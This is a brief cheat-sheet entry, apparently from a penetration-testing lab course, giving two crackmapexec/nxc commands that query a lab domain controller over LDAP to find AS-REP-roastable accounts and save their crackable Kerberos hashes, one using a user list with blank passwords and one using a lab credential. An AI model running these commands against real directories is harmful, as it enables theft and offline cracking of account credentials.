#### Bruteforcing Accounts for ASREPRoast
```shell
crackmapexec ldap dc01.inlanefreight.htb -u users.txt -p '' --asreproast asreproast.out
```
*Note*: Always use FQDN with *ldap*
#### Search for ASREPRoast Accounts
```shell
nxc ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! --asreproast asreproast.out
```